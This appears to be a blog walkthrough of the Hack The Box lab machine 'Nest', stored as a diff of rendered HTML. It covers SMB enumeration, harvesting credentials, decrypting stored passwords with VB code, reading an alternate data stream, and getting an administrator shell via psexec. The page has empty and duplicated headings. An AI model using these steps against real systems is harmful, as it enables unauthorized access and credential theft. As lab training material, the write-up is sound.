@@ -1,0 +1,382 @@
+I"O<p>Walkthrough for Nest - 10.10.10.178</p>
+
+<h2 id="overview">Overview</h2>
+
+<h2 id="setup">Setup</h2>
+
+<p>Running Kali I make a temporary working directory, set some variables and update all the things.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir </span>tmp <span class="o">&amp;&amp;</span> <span class="nb">cd </span>tmp
+<span class="nv">TARGET</span><span class="o">=</span>10.10.10.178
+<span class="nb">sudo </span>apt update <span class="o">&amp;&amp;</span> <span class="nb">sudo </span>apt upgrade
+</code></pre></div></div>
+
+<h2 id="scanning">Scanning</h2>
+
+<script src="https://gist.github.com/bovinehero/27082b91d142f1506c6ea5a263ecbccd.js"> </script>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code></code></pre></div></div>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<h2 id="rce">RCE</h2>
+
+<h2 id="getting-user">Getting User</h2>
+
+<h2 id="getting-root">Getting Root</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-Pn</span> <span class="nv">$TARGET</span>
+</code></pre></div></div>
+
+<p>I get</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap scan report for 10.10.10.178
+Host is up (0.037s latency).
+Not shown: 999 filtered ports
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+</code></pre></div></div>
+
+<p>I run an all ports quick very verbose scan:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-Pn</span> <span class="nv">$TARGET</span> <span class="nt">-p-</span> <span class="nt">-T4</span> <span class="nt">-vvv</span>
+</code></pre></div></div>
+
+<p>to get:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-29 20:16 GMT
+Initiating Parallel DNS resolution of 1 host. at 20:16
+Completed Parallel DNS resolution of 1 host. at 20:16, 0.01s elapsed
+DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
+Initiating SYN Stealth Scan at 20:16
+Scanning 10.10.10.178 [65535 ports]
+Discovered open port 445/tcp on 10.10.10.178
+Discovered open port 4386/tcp on 10.10.10.178
+SYN Stealth Scan Timing: About 21.60% done; ETC: 20:19 (0:01:52 remaining)
+SYN Stealth Scan Timing: About 57.27% done; ETC: 20:18 (0:00:46 remaining)
+Completed SYN Stealth Scan at 20:18, 89.89s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.178
+Host is up, received user-set (0.031s latency).
+Scanned at 2020-01-29 20:16:42 GMT for 89s
+Not shown: 65533 filtered ports
+Reason: 65533 no-responses
+PORT     STATE SERVICE      REASON
+445/tcp  open  microsoft-ds syn-ack ttl 127
+4386/tcp open  unknown      syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 89.99 seconds
+           Raw packets sent: 131135 (5.770MB) | Rcvd: 72 (3.233KB)
+</code></pre></div></div>
+
+<p>I poke the unkown service with telnet:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>telnet <span class="nv">$TARGET</span> 4386
+</code></pre></div></div>
+
+<p>to get a connection to HQK Reporting Service V1.2</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Trying 10.10.10.178...
+Connected to 10.10.10.178.
+Escape character is '^]'.
+
+HQK Reporting Service V1.2
+&gt;
+</code></pre></div></div>
+
+<p>I run a help to see what I can do:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">help</span>
+</code></pre></div></div>
+
+<p>Cool</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>This service allows users to run queries against databases using the legacy HQK format
+
+--- AVAILABLE COMMANDS ---
+
+LIST
+SETDIR &lt;Directory_Name&gt;
+RUNQUERY &lt;Query_ID&gt;
+DEBUG &lt;Password&gt;
+HELP &lt;Command&gt;
+</code></pre></div></div>
+
+<p>I try a few things but get errors, and I need a password to debug. OK onto SMB:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap <span class="nt">-H</span> 10.10.10.178 <span class="nt">-u</span> <span class="s1">'anonymous'</span> <span class="nt">-p</span> <span class="s1">''</span>
+</code></pre></div></div>
+
+<p>It get me in:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] Finding open SMB ports....
+[+] Guest SMB session established on 10.10.10.178...
+[+] IP: 10.10.10.178:445        Name: 10.10.10.178                                      
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        .                                                  
+        dr--r--r--                0 Wed Aug  7 23:53:46 2019    .
+        dr--r--r--                0 Wed Aug  7 23:53:46 2019    ..
+        dr--r--r--                0 Wed Aug  7 23:58:07 2019    IT
+        dr--r--r--                0 Mon Aug  5 22:53:41 2019    Production
+        dr--r--r--                0 Mon Aug  5 22:53:50 2019    Reports
+        dr--r--r--                0 Wed Aug  7 20:07:51 2019    Shared
+        Data                                                    READ ONLY
+        IPC$                                                    NO ACCESS       Remote IPC
+        Secure$                                                 NO ACCESS
+        .                                                  
+        dr--r--r--                0 Sat Jan 25 23:04:21 2020    .
+        dr--r--r--                0 Sat Jan 25 23:04:21 2020    ..
+        dr--r--r--                0 Fri Aug  9 16:08:23 2019    Administrator
+        dr--r--r--                0 Sun Jan 26 07:21:44 2020    C.Smith
+        dr--r--r--                0 Thu Aug  8 18:03:29 2019    L.Frost
+        dr--r--r--                0 Thu Aug  8 18:02:56 2019    R.Thompson
+        dr--r--r--                0 Wed Aug  7 23:56:02 2019    TempUser
+        Users                                                   READ ONLY
+</code></pre></div></div>
+
+<p>Seems like we have read access on a lot of shares, lets start with DATA:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="se">\\\\</span>10.10.10.178<span class="se">\\</span>DATA
+</code></pre></div></div>
+
+<p>It works and I perform a DIR listing</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient \\\\10.10.10.178\\DATA
+directory_create_or_exist: mkdir failed on directory /run/samba/msg.lock: Permission denied
+Unable to initialize messaging context
+Enter WORKGROUP\bhero's password: 
+Try "help" to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        0  Wed Aug  7 23:53:46 2019
+  ..                                  D        0  Wed Aug  7 23:53:46 2019
+  IT                                  D        0  Wed Aug  7 23:58:07 2019
+  Production                          D        0  Mon Aug  5 22:53:38 2019
+  Reports                             D        0  Mon Aug  5 22:53:44 2019
+  Shared                              D        0  Wed Aug  7 20:07:51 2019
+
+                10485247 blocks of size 4096. 6449704 blocks available
+smb: \&gt;
+</code></pre></div></div>
+
+<pre><code class="language-smb">cd Shared\Maintenance
+get "Maintenance Alerts.txt"
+cd \Shared\Templates\HR\
+get "Welcome Email.txt"
+
+</code></pre>
+
+<p>checking the files I get a username and password from SMB <code class="highlighter-rouge">TempUser:welcome2019</code></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat Welcome\ Email.txt 
+We would like to extend a warm welcome to our newest member of staff, &lt;FIRSTNAME&gt; &lt;SURNAME&gt;
+
+You will find your home folder in the following location: 
+\\HTB-NEST\Users\&lt;USERNAME&gt;
+
+If you have any issues accessing specific services or workstations, please inform the 
+UIT department and use the credentials below until all systems have been set up for you.
+
+Username: TempUser
+Password: welcome2019
+
+
+Thank you
+HR
+</code></pre></div></div>
+
+<p>I login to the users share with:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>smbclient //10.10.10.178/users/ <span class="nt">-U</span> TempUser
+</code></pre></div></div>
+
+<p>Supplying the password lets me perfom actions:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Enter WORKGROUP\TempUser's password: 
+Try "help" to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        0  Sat Jan 25 23:04:21 2020
+  ..                                  D        0  Sat Jan 25 23:04:21 2020
+  Administrator                       D        0  Fri Aug  9 16:08:23 2019
+  C.Smith                             D        0  Sun Jan 26 07:21:44 2020
+  L.Frost                             D        0  Thu Aug  8 18:03:01 2019
+  R.Thompson                          D        0  Thu Aug  8 18:02:50 2019
+  TempUser                            D        0  Wed Aug  7 23:55:56 2019
+
+                10485247 blocks of size 4096. 6449936 blocks available
+smb: \&gt; 
+</code></pre></div></div>
+
+<p>I can only access TempUser and there’s nothing of any use, lets try password reuse:
+L.Frost is our new user as I can login with:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>smbclient //10.10.10.178/users/ <span class="nt">-U</span> L.Frost
+</code></pre></div></div>
+
+<p>I have nothing, but maybe a different share?</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>smbclient //10.10.10.178/DATA/ <span class="nt">-U</span> L.Frost
+
+</code></pre></div></div>
+
+<p>works, but I have no access…. ok try with TempUser</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>smbclient //10.10.10.178/DATA/ <span class="nt">-U</span> L.Frost
+
+</code></pre></div></div>
+
+<p>looks like tempUser works in IT</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: \&gt; cd IT
+smb: \IT\&gt; dir
+  .                                   D        0  Wed Aug  7 23:58:07 2019
+  ..                                  D        0  Wed Aug  7 23:58:07 2019
+  Archive                             D        0  Mon Aug  5 23:33:58 2019
+  Configs                             D        0  Wed Aug  7 23:59:34 2019
+  Installs                            D        0  Wed Aug  7 23:08:30 2019
+  Reports                             D        0  Sun Jan 26 00:09:13 2020
+  Tools                               D        0  Mon Aug  5 23:33:43 2019
+
+</code></pre></div></div>
+
+<p>we go to <code class="highlighter-rouge">\IT\Configs\RU Scanner\</code> and we find RU_config.xml</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0"?&gt;</span>
+<span class="nt">&lt;ConfigFile</span> <span class="na">xmlns:xsi=</span><span class="s">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="na">xmlns:xsd=</span><span class="s">"http://www.w3.org/2001/XMLSchema"</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;Port&gt;</span>389<span class="nt">&lt;/Port&gt;</span>
+  <span class="nt">&lt;Username&gt;</span>c.smith<span class="nt">&lt;/Username&gt;</span>
+  <span class="nt">&lt;Password&gt;</span>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=<span class="nt">&lt;/Password&gt;</span>
+<span class="nt">&lt;/ConfigFile&gt;</span>
+</code></pre></div></div>
+
+<p>in \IT\configs\NotepadPlusPlus\ we find this in config.xml</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;History</span> <span class="na">nbMaxFile=</span><span class="s">"15"</span> <span class="na">inSubMenu=</span><span class="s">"no"</span> <span class="na">customLength=</span><span class="s">"-1"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;File</span> <span class="na">filename=</span><span class="s">"C:\windows\System32\drivers\etc\hosts"</span> <span class="nt">/&gt;</span>
+        <span class="nt">&lt;File</span> <span class="na">filename=</span><span class="s">"\\HTB-NEST\Secure$\IT\Carl\Temp.txt"</span> <span class="nt">/&gt;</span>
+        <span class="nt">&lt;File</span> <span class="na">filename=</span><span class="s">"C:\Users\C.Smith\Desktop\todo.txt"</span> <span class="nt">/&gt;</span>
+<span class="nt">&lt;/History&gt;</span>
+</code></pre></div></div>
+
+<p>We move to the secure share and take all the goodies:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>smbclient //10.10.10.178/Secure<span class="nv">$ </span><span class="nt">-U</span> TempUser
+<span class="nb">cd</span> <span class="s2">"IT</span><span class="se">\C</span><span class="s2">arl</span><span class="se">\V</span><span class="s2">B Projects</span><span class="se">\W</span><span class="s2">IP</span><span class="se">\R</span><span class="s2">U</span><span class="se">\R</span><span class="s2">UScanner</span><span class="se">\"</span><span class="s2">
+mget *
+</span></code></pre></div></div>
+
+<p>this gets us a vb project, looking through it we see it calls the RU_Config.xl, so I copy that to the dir I stored the code in and build it using dotnet core</p>
+
+<p>I make a new project:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dotnet new console <span class="nt">-lang</span> VB
+</code></pre></div></div>
+
+<p>Edit the Program.vb to be:</p>
+
+<div class="language-vb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">Imports</span> <span class="nn">System</span>
+
+<span class="k">Module</span> <span class="nn">Program</span>
+    <span class="k">Sub</span> <span class="nf">Main</span><span class="p">(</span><span class="n">args</span> <span class="ow">As</span> <span class="kt">String</span><span class="p">())</span>
+        <span class="nb">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">"Hello World!"</span><span class="p">)</span>
+        <span class="k">Dim</span> <span class="nv">test</span> <span class="ow">As</span> <span class="k">New</span> <span class="n">SsoIntegration</span> <span class="k">With</span> <span class="p">{.</span><span class="n">Username</span> <span class="o">=</span> <span class="s">"c.smith"</span><span class="p">,</span> <span class="p">.</span><span class="n">Password</span> <span class="o">=</span> <span class="n">Utils</span><span class="p">.</span><span class="n">DecryptString</span><span class="p">(</span><span class="s">"fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE="</span><span class="p">)}</span>
+        <span class="nb">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">test</span><span class="p">.</span><span class="n">Username</span><span class="p">)</span>
+        <span class="nb">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">test</span><span class="p">.</span><span class="n">Password</span><span class="p">)</span>
+
+    <span class="k">End</span> <span class="k">Sub</span>
+<span class="k">End</span> <span class="k">Module</span>
+</code></pre></div></div>
+<p>Copy <code class="highlighter-rouge">SsoIntegration.vb</code> and <code class="highlighter-rouge">Utils.vb</code> to the project directory and run with:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dotnet run
+</code></pre></div></div>
+
+<p>this gives:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Hello World!
+c.smith
+xRxRxPANCAK3SxRxRx
+</code></pre></div></div>
+
+<p>Woo! now we have c.smith’s creds.</p>
+
+<p>Lets try his share:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo smbclient //10.10.10.178/users/ -U c.smith
+</code></pre></div></div>
+
+<p>This gives <code class="highlighter-rouge">user.txt</code> and in <code class="highlighter-rouge">\c.smith\HQK Reporting\</code> the <code class="highlighter-rouge">Debug Mode Password.txt</code>, but Debug Mode Password.txt is empty so we check the data stream</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>allinfo <span class="s2">"Debug Mode Password.txt"</span>
+</code></pre></div></div>
+
+<p>to get</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>altname: DEBUGM~1.TXT
+create_time:    Fri Aug  9 00:06:12 2019 BST
+access_time:    Fri Aug  9 00:06:12 2019 BST
+write_time:     Fri Aug  9 00:08:17 2019 BST
+change_time:    Fri Aug  9 00:08:17 2019 BST
+attributes: A (20)
+stream: [::$DATA], 0 bytes
+stream: [:Password:$DATA], 15 bytes
+</code></pre></div></div>
+
+<p>and download</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>get "DEBUGM~1.TXT:Password:$DATA"
+</code></pre></div></div>
+
+<p>this gets the password <code class="highlighter-rouge">WBQ201953D8w</code></p>
+
+<p>C:\Program Files\HQK\logs</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Domain=nest.local
+Port=389
+BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local
+User=Administrator
+Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=
+</code></pre></div></div>
+
+<p>read this:https://dotnetfiddle.net/LdhDaa</p>
+
+<div class="language-vb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">Imports</span> <span class="nn">System</span>
+<span class="k">Imports</span> <span class="nn">System.Text.RegularExpressions</span>
+<span class="k">Imports</span> <span class="nn">System.Text</span>
+<span class="k">Imports</span> <span class="nn">System.Security.Cryptography</span>
+
+<span class="k">Public</span> <span class="k">Module</span> <span class="nn">Module1</span>
+
+	<span class="k">Public</span> <span class="k">Sub</span> <span class="nf">Main</span><span class="p">()</span>
+		<span class="k">Dim</span> <span class="nv">Phone</span> <span class="o">=</span> <span class="n">DecryptString</span><span class="p">(</span><span class="s">"yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4="</span><span class="p">)</span>
+
+
+		<span class="nb">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">Phone</span><span class="p">)</span>
+		
+	<span class="k">End</span> <span class="k">Sub</span>
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=</code> is <code class="highlighter-rouge">XtH4nkS4Pl4y1nGX</code></p>
+
+<p>It uses standard encryption packages in windows, perhaps we reverse engineer the binary?</p>
+
+<p>this is the admin password</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/share/doc/python3-impacket/examples/psexec.py administrator:XtH4nkS4Pl4y1nGX@10.10.10.178
+</code></pre></div></div>
+
+<p>on the shell go to admin desktop:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>type root.txt
+6594c2eb084bc0f08a42f0b94b878c41
+</code></pre></div></div>
+
+<h2 id="getting-user-1">Getting User</h2>
+
+<p>xxxxxxxxxxxxxxxxxxxx7e05f426e987</p>
+
+<h2 id="getting-root-1">Getting Root</h2>
+
+<p>xxxxxxxxxxxxxxxxxxxxf0b94b878c41</p>
+:ET
